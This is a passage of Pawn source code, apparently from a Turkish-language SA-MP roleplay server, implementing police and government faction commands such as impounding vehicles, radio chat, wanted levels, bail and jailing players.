					iVehIndex = GetPlayerVehicle(i, iVehTowed);
					if(iVehIndex != -1) {
						iVehType = 1;
						iTargetOwner = i;
						break;
					}
				}
				if(!iVehType) {
					for(new i; i < MAX_FAMILY; ++i) {
						iVehIndex = GetGangVehicle(i, iVehTowed);
						if(iVehIndex != -1) {
							iVehType = 2;
							iTargetOwner = i;
							break;
						}
					}
				}
				switch(iVehType) {
					case 0, 2: {
						SendClientMessage(playerid, COLOR_GRAD1, "Araç herhangi birine ait deðil.");
						DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
						SetVehiclePos(iVehTowed, 0, 0, 0); // Attempted desync fix
						SetVehicleToRespawn(iVehTowed);
					}
					case 1: {

						PlayerVehicleInfo[iTargetOwner][iVehIndex][pvImpounded] = 1;
						PlayerVehicleInfo[iTargetOwner][iVehIndex][pvSpawned] = 0;
						PlayerVehicleInfo[iTargetOwner][iVehIndex][pvId] = INVALID_PLAYER_VEHICLE_ID;
						DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
						SetVehiclePos(iVehTowed, 0, 0, 0); // Attempted desync fix
						DestroyVehicle(iVehTowed);
						VehicleRadioStation[iVehTowed] = 0;

						VehicleSpawned[iTargetOwner]--;
						--PlayerCars;

						new
							szMessage[96];

						format(szMessage, sizeof(szMessage),"*  %s adlý kiþinin %s adlý aracýný baðladýn.",GetPlayerNameEx(iTargetOwner), VehicleName[PlayerVehicleInfo[iTargetOwner][iVehIndex][pvModelId] - 400]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);

						format(szMessage, sizeof(szMessage), " %s adlý aracýn baðlandý. Dillimore eyaletinde .", VehicleName[PlayerVehicleInfo[iTargetOwner][iVehIndex][pvModelId] - 400]);
						SendClientMessage(iTargetOwner, COLOR_LIGHTBLUE, szMessage);

						format(szMessage, sizeof(szMessage), "MERKEZ: Memur %s %s adlý kiþinin %s adlý aracýný baðladý. (ödenmemiþ ceza : %i$).", GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetOwner), VehicleName[PlayerVehicleInfo[iTargetOwner][iVehIndex][pvModelId] - 400], PlayerVehicleInfo[iTargetOwner][iVehIndex][pvTicket]);
						SendRadioMessage(PlayerInfo[playerid][pFaction], RADIO, szMessage);
					}
				}
				arr_Towing[playerid] = INVALID_VEHICLE_ID;
			}
		}
		default: SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanmaya yetkin yok.");
	}
	return 1;
}

CMD:merkezidagitim(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5) {
		if(PlayerInfo[playerid][pRank] >= 5) {
			if(isnull(params))
				return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /merkezidagitim [mesaj]");
			else {
				new
					szMessage[128];
				format(szMessage, sizeof(szMessage), "Merkezi Daðýtým: %s", params);
				SendRadioMessage(PlayerInfo[playerid][pFaction], RADIO, szMessage);
			}
		} else SendClientMessage( playerid, COLOR_GRAD2, "Rank 3 ve üzeri bu komutu kullanabilir." );
	} else SendClientMessage(playerid, COLOR_GRAD2, "Devlet memuru deðilsin.");
	return true;
}

CMD:r(playerid, params[]) {
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: (/r)adio [yazý]");

	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pFaction] == 6 || PlayerInfo[playerid][pFaction] == 9) {
	    new
	        szMessage[128],
	        szRank[64],
	        szEmployer[64],
	        szDivision[64];

        GetPlayerFactionInfo(playerid, szRank, szDivision, szEmployer);

        if(!strlen(szDivision) || !strcmp(szDivision, "Yok", true)) {
			format(szMessage, sizeof(szMessage), "** %s %s: %s **", szRank, GetPlayerNameEx(playerid), params);
		} else {
		    format(szMessage, sizeof(szMessage), "** %s (%s) %s: %s **", szRank, szDivision, GetPlayerNameEx(playerid), params);
		}

		switch(PlayerInfo[playerid][pFaction]) {
			case 1: SendRadioMessage(1, RADIO, szMessage);
			case 2: SendRadioMessage(2, RADIO, szMessage);
			case 3: SendRadioMessage(3, TEAM_CYAN_COLOR, szMessage);
			case 5: SendRadioMessage(5, COLOR_GOV, szMessage);
			case 6: SendRadioMessage(6, TEAM_TAXI_COLOR, szMessage);
			case 9: SendRadioMessage(9, TEAM_NEWS_COLOR, szMessage);
		}

		format(szMessage, sizeof(szMessage), "(radyo) %s", params);
		SetPlayerChatBubble(playerid, szMessage, COLOR_WHITE, 15.0,5000);

		printf("%s ('** %s %s %s: %s **')", szEmployer, szRank, szDivision, GetPlayerNameEx(playerid), params);
	}

	return 1;
}

CMD:d(playerid, params[]) {
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: (/d)epartman [yazý]");

	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5) {
	    new
	        szMessage[128],
	        szRank[64],
	        szEmployer[64],
	        szDivision[64];

        GetPlayerFactionInfo(playerid, szRank, szDivision, szEmployer);

        if(!strlen(szDivision) || !strcmp(szDivision, "Yok", true)) {
			format(szMessage, sizeof(szMessage), "** %s %s %s: %s **", szEmployer, szRank, GetPlayerNameEx(playerid), params);
		} else {
		    format(szMessage, sizeof(szMessage), "** %s %s (%s) %s: %s **", szEmployer, szRank, szDivision, GetPlayerNameEx(playerid), params);
		}

		SendRadioMessage(1, DEPTRADIO, szMessage);
		SendRadioMessage(2, DEPTRADIO, szMessage);
	 	SendRadioMessage(3, DEPTRADIO, szMessage);
		SendRadioMessage(5, DEPTRADIO, szMessage);

		format(szMessage, sizeof(szMessage), "(radyo) %s", params);
		SetPlayerChatBubble(playerid, szMessage, COLOR_WHITE, 15.0, 5000);

		foreach(Player, i)
		{
			if(PlayerInfo[i][pReceiver] > 0)
			{
				if(GetPVarType(i, "pReceiverOn"))
				{
					if(GetPVarInt(i, "pReceiverMLeft") > 0)
					{
						format(szMessage, sizeof(szMessage), "** (alýcý) %s: %s **", GetPlayerNameEx(playerid), params);
						SendClientMessage(i, DEPTRADIO, szMessage);
						SetPVarInt(i, "pReceiverMLeft", GetPVarInt(i, "pReceiverMLeft") - 1);
					}
					else
					{
						PlayerInfo[i][pReceiver]--;
						SetPVarInt(i, "pReceiverMLeft", 40);
						SendClientMessage(i, DEPTRADIO, "Departman radyosunun bataryasý bitti!");
					}
				}
			}
			return 1;
		}
	}
	return 1;
}

CMD:m(playerid, params[]) {
	if(!isnull(params)) {
		if((GetPVarInt(playerid, "EventToken") == 1 || PlayerInfo[playerid][pJailTime] > 0) && AdminDuty[playerid] == 0)
			return SendClientMessage(playerid, COLOR_WHITE, "Þu an bunu yapamazsýn.");
		switch(PlayerInfo[playerid][pFaction]) {
			case 1, 2, 3, 5, 9: {

				new
					szMessage[128];

				format(szMessage, sizeof(szMessage), "(megafon) %s: %s", GetPlayerNameEx(playerid), params);
				ProxDetector(60.0, playerid, szMessage, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW, COLOR_YELLOW);
			}
			default: SendClientMessage(playerid, COLOR_GRAD2, "   Megafonu kullanabilmek için yetkin yok.");
		}
	} else SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: (/m)egafon [yazý]");
	return 1;
}

CMD:su(playerid, params[]) {
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		if(PlayerInfo[playerid][pJailed] > 0) {
			return SendClientMessage(playerid, COLOR_WHITE, "Hapiste bunu kullanamazsýn.");
		}

		new
			iTargetID,
			szCrime[64];

		if(sscanf(params, "us[64]", iTargetID, szCrime)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: (/su)cekle [Oyuncu ID/Ýsim] [suç tanýmý]");
		}
		else if(!IsPlayerConnected(iTargetID)) {
			SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
		}
		else if(IsACop(iTargetID)) {
			SendClientMessage(playerid, COLOR_GREY, "Bu komutu devlet memuru üzerinde kullanamazsýn.");
		}
		else if(PlayerInfo[iTargetID][pFaction] == 5) {
			SendClientMessage(playerid, COLOR_GREY, "Bu kiþi diplomatik dokunulmazlýða sahip.");
		}
		else if(PlayerInfo[iTargetID][pWantedLevel] >= 6) {
			SendClientMessage(playerid, COLOR_GRAD2, "Kiþi zaten 6 yýldýza sahip.");
		}
		else {

			new
				szMessage[128];

			++PlayerInfo[iTargetID][pCrimes];
			SetPlayerWantedLevel(iTargetID, ++PlayerInfo[iTargetID][pWantedLevel]);
			if(PlayerInfo[iTargetID][pWantedLevel] > 5)
 			{
				SetPlayerColor(iTargetID, WANTED_COLOR);
			}

			format(szMessage, sizeof(szMessage), "Bir suç iþlediðin rapor edildi (%s), Memur: %s.", szCrime, GetPlayerNameEx(playerid));
			SendClientMessage(iTargetID, COLOR_LIGHTRED, szMessage);

			format(szMessage, sizeof(szMessage), "Þuanki yýldýz seviyesi: %d", PlayerInfo[iTargetID][pWantedLevel]);
			SendClientMessage(iTargetID, COLOR_YELLOW, szMessage);

			if(AdminDuty[iTargetID] == 0) {
				new
					szCleanDescription[64],
					szQuery[270];

				mysql_real_escape_string(szCrime, szCleanDescription, g_MySQLConnections[0]);

				format(szQuery, sizeof(szQuery), "INSERT INTO crimes (crimeIssuer, crimeIssuedTo, crimeDescription, crimeIssuerName, crimeIssuedToName) VALUES(%d, %d, '%s', '%s', '%s')", PlayerInfo[playerid][pID], PlayerInfo[iTargetID][pID], szCleanDescription, GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
				mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
			}
			foreach(Player, i) if(IsACop(i) || PlayerInfo[i][pFaction] == 5 && PlayerInfo[i][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
				format(szMessage, sizeof(szMessage), "Merkez: Tüm Birimlerin Dikkatine (Memur: %s)",GetPlayerNameEx(playerid));
				SendClientMessage(i, TEAM_BLUE_COLOR, szMessage);
				format(szMessage, sizeof(szMessage), "Merkez: Suç: %s, Zanlý: %s", szCrime, GetPlayerNameEx(iTargetID));
				SendClientMessage(i, TEAM_BLUE_COLOR, szMessage);
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "Devlet memuru deðilsin.");
	return 1;
}

CMD:sah(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,19, 221.7326, 183.5450, 1003.0313)) {
			ShowPlayerDialogEx(playerid, SAN_DUTYMENU, DIALOG_STYLE_LIST, "SA:Habeleri Dolap","Ilk Yardim Cantasi\nCelik Yelek\nShotgun ($150)\nKamera", "Seç", "Iptal");
		} else SendClientMessage(playerid, COLOR_WHITE, "SAH dolabýna yakýn deðilsin.");
	}
	return 1;
}
CMD:lst(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 6 || PlayerInfo[playerid][pLeader] == 6) {
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,19,1492.7949, 1308.4761, 1093.2922)) {
			ShowPlayerDialogEx(playerid, SAN_DUTYMENU, DIALOG_STYLE_LIST, "LST Dolap","Ilk Yardim Cantasi\nCelik Yelek\nShutgun($150)", "Seç", "Iptal");
		} else SendClientMessage(playerid, COLOR_WHITE, "LST dolabýna yakýn deðilsin.");
	}
	return 1;
}
CMD:lspd(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,266.7658,109.5932,1004.6172))
		{
			if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2) ShowPlayerDialogEx(playerid, FDUTYMENU, DIALOG_STYLE_LIST, "FBI Menu","Is basi\nEkipman\nSWAT Uniformasi\nUniforma\nGizli Gorev\nSuc Temizle", "Seç", "Iptal");
			else ShowPlayerDialogEx(playerid, DUTYMENU, DIALOG_STYLE_LIST, "LSPD DOLAP","Is basi\nEkipman\nTaktiksel\nUniforma\nGizli Gorev\nSuc Temizle", "Seç", "Iptal");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "LSPD dolabýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:mvb(playerid, params[])
{
    if(IsMDCPermitted(playerid))
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
            ShowPlayerDialogEx(playerid, MDC_MAIN, DIALOG_STYLE_LIST, "SA-MVB - Giriþ yapýldý", "*Memur Bul\n*Sivil Bilgisi\n*Devlet Birimleri", "Tamam", "Iptal");
            ConnectedToPC[playerid] = 1337;
        }
        else SendClientMessage(playerid, COLOR_GREY, "Araçta deðilsin.");
    }
    return 1;
}

CMD:aracaat(playerid, params[])
{
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		new
			string[128],
			giveplayerid,
			seat;

		if(sscanf(params, "ud", giveplayerid, seat))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /aracaat [Oyuncu ID/Ýsim] [Koltuk ID 1-3]");

		if(!IsPlayerConnected(giveplayerid))
			return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

		if(IsPlayerInAnyVehicle(playerid))
			return SendClientMessage(playerid, COLOR_GREY, "Araçtayken bunu yapamazsýn.");

		if(seat < 1 || seat > 3)
			return SendClientMessage(playerid, COLOR_GRAD1, "Koltuk numarasý 1-3 arasýnda olmalýdýr.");

		if(IsACop(giveplayerid))
			return SendClientMessage(playerid, COLOR_GREY, "Los Santos Güvenlik Güçlerindeki birini araca atamazsýn.");

		if(IsPlayerInAnyVehicle(giveplayerid))
			return SendClientMessage(playerid, COLOR_GREY, "Bu kiþi zaten bir arabada.");

		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_GREY, "Kendini arabaya atamazsýn!");

		if(ProxDetectorS(8.0, playerid, giveplayerid)) {
			if(PlayerCuffed[giveplayerid] == 2) {
				new
					carid = gLastCar[playerid];
				if(IsSeatAvailable(carid, seat)) {
					new Float:pos[6];
					GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
					GetPlayerPos(giveplayerid, pos[3], pos[4], pos[5]);
					GetVehiclePos(carid, pos[0], pos[1], pos[2]);
					if(floatcmp(floatabs(floatsub(pos[0], pos[3])), 10.0) != -1 &&
					floatcmp(floatabs(floatsub(pos[1], pos[4])), 10.0) != -1 &&
					floatcmp(floatabs(floatsub(pos[2], pos[5])), 10.0) != -1) return false;
					format(string, sizeof(string), "* %s adlý kiþi tarafýndan arabaya atýldýn.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s adlý kiþiyi arabaya attýn.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s, %s adlý kiþiyi arabaya atar.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GameTextForPlayer(giveplayerid, "~r~Arabaya Atildi", 2500, 3);
					ClearAnimations(giveplayerid, 1);
					TogglePlayerControllable(giveplayerid, false);
					PutPlayerInVehicle(giveplayerid, carid, seat);
					if(PlayerDraggedBy[giveplayerid] != INVALID_PLAYER_ID) {
						IsCopDragging[PlayerDraggedBy[giveplayerid]] = INVALID_PLAYER_ID;
						PlayerDragged[giveplayerid] = 0;
						PlayerDraggedBy[giveplayerid] = INVALID_PLAYER_ID;
					}
				} else return SendClientMessage(playerid, COLOR_GREY, "Bu koltuk kullanýlabilir deðil!");
			} else return SendClientMessage(playerid, COLOR_GREY, "Bu kiþi kelepçeli deðil.");
		} else return SendClientMessage(playerid, COLOR_GREY, "Aracýna veya Kiþiye yakýn deðilsin!");
	} else SendClientMessage(playerid, COLOR_GRAD2, "Polis / FBI / Sahil Güvenlik deðilsin.");
	return 1;
}

CMD:kefalet(playerid, params[])
{
	if(PlayerInfo[playerid][pJailed] == 1 || PlayerInfo[playerid][pJailed] == 2)
	{
		if(JailPrice[playerid] > 0)
		{
			if(GetPlayerCash(playerid) > JailPrice[playerid])
			{
				new string[128];
				format(string, sizeof(string), "%d$ kefalet parasýný ödedin, Artýk özgürsün.", JailPrice[playerid]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, -JailPrice[playerid]);
				JailPrice[playerid] = 0;
				WantLawyer[playerid] = 0; CallLawyer[playerid] = 0;
				PlayerInfo[playerid][pJailTime] = 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Kefalet parasýný karþýlayamýyorsun.");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Kefalet mümkün deðil.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Hapiste deðilsin.");
	}
	return 1;
}

CMD:teslimet(playerid, params[]) {
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		if(!IsPlayerInRangeOfPoint(playerid,6.0,1992.484130, -2312.814208, 13.546875))
			return SendClientMessage(playerid, COLOR_GREY, "Los Santos Havalimanýndaki teslim noktasýnda deðilsin.");

		if(PlayerInfo[playerid][pRank] < 2)
			return SendClientMessage(playerid, COLOR_GREY, "Rank 2 ve üstü olmalýsýn.");

        new
			suspect = GetClosestPlayer(playerid);

		if(IsPlayerConnected(suspect)) {
			if(ProxDetectorS(15.0, playerid,suspect)) {
				if(PlayerInfo[suspect][pConnectTime] <= 8)
					return SendClientMessage(playerid, COLOR_GREY, "Suçlu en az 8 saat online olmalýdýr.Normal hapse atýnýz.");

				if(PlayerInfo[suspect][pWantedLevel] < 6)
					return SendClientMessage(playerid, COLOR_GREY, "Kiþi demorgan'a gönderilmek için 6 yýldýza sahip olmalýdýr.Daha düþük suçlular normal hapse atýlýr.");

				if(PlayerCuffed[suspect] == 0)
					return SendClientMessage(playerid, COLOR_GREY, "Kiþi araçta deðil veya kelepçeli deðil");

				new
					fine,
					allmoney;

				if(PlayerInfo[suspect][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(suspect), HouseInfo[PlayerInfo[suspect][pHouse]][hOwner], true) == 0) {
					allmoney = HouseInfo[PlayerInfo[suspect][pHouse]][hSafeMoney]+GetPlayerCash(suspect)+PlayerInfo[suspect][pBank];
				} else if(PlayerInfo[suspect][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(suspect), HouseInfo[PlayerInfo[suspect][pHouse2]][hOwner], true) == 0) {
					allmoney += HouseInfo[PlayerInfo[suspect][pHouse2]][hSafeMoney];
				} else {
					allmoney = GetPlayerCash(suspect)+PlayerInfo[suspect][pBank];
				}

				if(allmoney < 1) {
					fine = 0;
				} else {
					fine = 3*allmoney/100;
				}

				if(fine > 3000) {
					fine = 3000;
				}

				GivePlayerCash(suspect, -fine);
				SetPlayerArmedWeapon(suspect, 0);
            	ResetPlayerWeaponsEx(suspect);

				new string[128];
				format(string, sizeof(string), "* %s adlý suçluyu hapishaneye teslim ettin!", GetPlayerNameEx(suspect));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

				format(string, sizeof(string), "45 dakika hapse atýldýn ve %d$ ceza ödedin.   Kefalet: Hayýr", fine);
				SendClientMessage(suspect, COLOR_LIGHTBLUE, string);
				if(PlayerDraggedBy[suspect] != INVALID_PLAYER_ID) {
					IsCopDragging[PlayerDraggedBy[suspect]] = INVALID_PLAYER_ID;
					PlayerDragged[suspect] = 0;
					PlayerDraggedBy[suspect] = INVALID_PLAYER_ID;
				}
				PhoneOnline[suspect] = 1;
				DeletePVar(suspect, "IsFrozen");
				PlayerInfo[suspect][pArrested] += 1;
				SetPlayerFree(suspect,playerid, "hapse atýldý");
				PlayerInfo[suspect][pWantedLevel] = 0;
				SetPlayerToTeamColor(suspect);
				SetPlayerWantedLevel(suspect, 0);
				TogglePlayerControllable(suspect, 1);
				ClearAnimations(suspect, 1);
				SetPlayerSpecialAction(suspect, SPECIAL_ACTION_NONE);
				PlayerCuffed[suspect] = 0;
				DeletePVar(suspect, "PlayerCuffed");
				PlayerCuffedTime[suspect] = 0;
				format(PlayerInfo[suspect][pPrisonReason], 128, "Level 6 Wanted [6 stars]");
				format(PlayerInfo[suspect][pPrisonedBy], MAX_PLAYER_NAME, "%s", GetPlayerNameEx(playerid));
				PlayCrimeReportForPlayer(playerid, suspect, 6);

				PlayerInfo[suspect][pJailed] = 4;
				PlayerInfo[suspect][pJailTime] = 2700;


				if(PlayerVehicleInfo[suspect][0][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][0][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][1][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][1][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][2][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][2][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][3][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][3][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][4][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][4][pvTicket] = 0;
				}

				GameTextForPlayer(suspect, "~w~Hapishaneye ~n~~r~ Hosgeldin", 5000, 3);
		    	LoadObjectsForPlayer(suspect);
				SetPlayerInterior(suspect, 69);
				PlayerInfo[suspect][pVW] = 696969;
				PlayerInfo[suspect][pInt] = 69;
				SetPlayerVirtualWorld(suspect, 696969);
				new rand = random(sizeof(AdminPrisonFloat));
				SetPlayerPos(suspect, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);
				SetPlayerSkin(suspect, 50);
				SetPlayerColor(suspect, TEAM_ORANGE_COLOR);

				if(IsPlayerAttachedObjectSlotUsed(suspect, 0))
					RemovePlayerAttachedObject(suspect, 0);
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Pois / FBI deðilsin!");
	}
	return 1;
}

CMD:tasi(playerid, params[]) return cmd_surukle(playerid, params);
CMD:sucluyutasi(playerid, params[]) return cmd_surukle(playerid, params);
CMD:kolunagir(playerid, params[]) return cmd_surukle(playerid, params);
CMD:surukle(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		new id, string[ 128 ];
		if( sscanf( params, "u", id ) )
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /surukle [Oyuncu ID/Ýsim]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

		if(GetDistanceBetweenPlayers(id, playerid) > 4)
			return SendClientMessage(playerid, COLOR_GREY, "Bu kiþiye yeterince yaklaþmadýn!");

		if(PlayerCuffed[id] == 0)
			return SendClientMessage(playerid, COLOR_GREY, "Bu kiþi kelepçeli deðil.");

		if(PlayerCuffed[id] == 1)
			return SendClientMessage(playerid, COLOR_GREY, "Þok tabancasýyla vurulmuþ birisini sürükleyemezsin.");

		if(id == playerid)
			return SendClientMessage(playerid, COLOR_GREY, "Kendini sürükleyemezsin!");

		if(GetPlayerState(id) != PLAYER_STATE_ONFOOT)
			return SendClientMessage(playerid, COLOR_GREY, "Bu kiþi bir araç içinde, Önce onu dýþarý çýkarmalýsýn.");

		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
			return SendClientMessage(playerid, COLOR_GREY, "Araç içindeyken bu komutu kullanamazsýn.");

		if(GetPVarInt(playerid, "PBM") > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");

		if(GetPVarInt(playerid, "EventToken") != 0)
			return SendClientMessage(playerid, COLOR_GREY, "Tazerini etkinlikteyken kullanamazsýn.");

		if(PlayerCuffedTime[playerid] > 0)
			return SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");

		if(GetPVarInt(playerid, "Injured") == 1)
			return SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");

		if(PlayerInfo[playerid][pJailed] > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "Hapiste bunu kullanamazsýn.");

		if(PlayerCuffed[playerid] >= 1)
			return SendClientMessage(playerid, COLOR_WHITE, "Kelepçeli yada tazerliyken bunu kullanamazsýn.");

		if(GetPVarInt(id, "Injured") == 1)
			return SendClientMessage(playerid, COLOR_GREY, "Yaralý kiþileri kelepçeleyemezsin.");

		if(PlayerDragged[id] == 1) {
			format(string, sizeof(string), "* %s adlý kiþi %s adlý kiþiyi sürüklemeyi býrakýr.", GetPlayerNameEx(playerid), GetPlayerNameEx(id));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			GameTextForPlayer(id, "~r~Released!", 2500, 3);
			IsCopDragging[PlayerDraggedBy[id]] = INVALID_PLAYER_ID;
			PlayerDragged[id] = 0;
			PlayerDraggedBy[id] = INVALID_PLAYER_ID;
			DeletePVar(playerid, "Dragging");
		} else {
			if(IsCopDragging[playerid] != INVALID_PLAYER_ID)
				return SendClientMessage(playerid, COLOR_GREY, "Ayný anda en fazla 1 kiþi sürükleyebilirsin.");

			format(string, sizeof(string), "* %s adlý kiþi %s adlý kiþiyi kol ve omuzundan tutar.", GetPlayerNameEx(playerid), GetPlayerNameEx(id));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			GameTextForPlayer(id, "~r~Restrained!", 2500, 3);
			ApplyAnimation(id, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0, 1);
			SetPlayerSpecialAction(id, SPECIAL_ACTION_CUFFED);
			PlayerDragged[id] = 1;
			PlayerDraggedBy[id] = playerid;
			IsCopDragging[playerid] = id;
			SetPVarInt(playerid, "Dragging", id);
		}
	}
	else SendClientMessage(playerid, COLOR_GREY, " Polis/FBI deðilsin!");
	return true;
}

CMD:nerdeyim(playerid, params[]) {
	if(!IsBETAServer())
	    return 1;

	new
	    Float: fPos[3],
	    szMessage[128];

	format(szMessage, sizeof(szMessage), "Kaydedilmiþ Koordinatlarýnýz: %f %f %f", PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
	SendClientMessage(playerid, COLOR_WHITE, szMessage);

	GetPlayerPos(playerid, fPos[0], fPos[1], fPos[2]);
	format(szMessage, sizeof(szMessage), "Bulunduðunuz Koordinatlarýnýz: %f %f %f", fPos[0], fPos[1], fPos[2]);
	SendClientMessage(playerid, COLOR_WHITE, szMessage);
	return 1;
}

CMD:hapseat(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		if(!IsAtArrestPoint(playerid))
			return SendClientMessage(playerid, COLOR_GREY, "Tutuklama bölgesinde deðilsin.");

		new
			suspect = GetClosestPlayer(playerid);
		if(IsPlayerConnected(suspect)) {
			if(ProxDetectorS(5.0, playerid, suspect)) {
				new
					allmoney,
					cap,
					string[128],
					moneys,
					time,
					bail,
					bailprice;

				if(PlayerInfo[suspect][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(suspect), HouseInfo[PlayerInfo[suspect][pHouse]][hOwner], true) == 0) {
					allmoney = HouseInfo[PlayerInfo[suspect][pHouse]][hSafeMoney]+GetPlayerCash(suspect)+PlayerInfo[suspect][pBank];
				} else if(PlayerInfo[suspect][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(suspect), HouseInfo[PlayerInfo[suspect][pHouse2]][hOwner], true) == 0) {
					allmoney += HouseInfo[PlayerInfo[suspect][pHouse2]][hSafeMoney];
				} else {
					allmoney = GetPlayerCash(suspect)+PlayerInfo[suspect][pBank];
				}
				cap = 5*allmoney/100;
				if(cap > 1000 || cap < 1) {
					cap = 1000;
				}

				if(PlayerInfo[suspect][pWantedLevel] < 1) {
					return SendClientMessage(playerid, COLOR_GREY, "Kiþi en az 1 yýldýz'a sahip olmalýdýr.");
				} else {
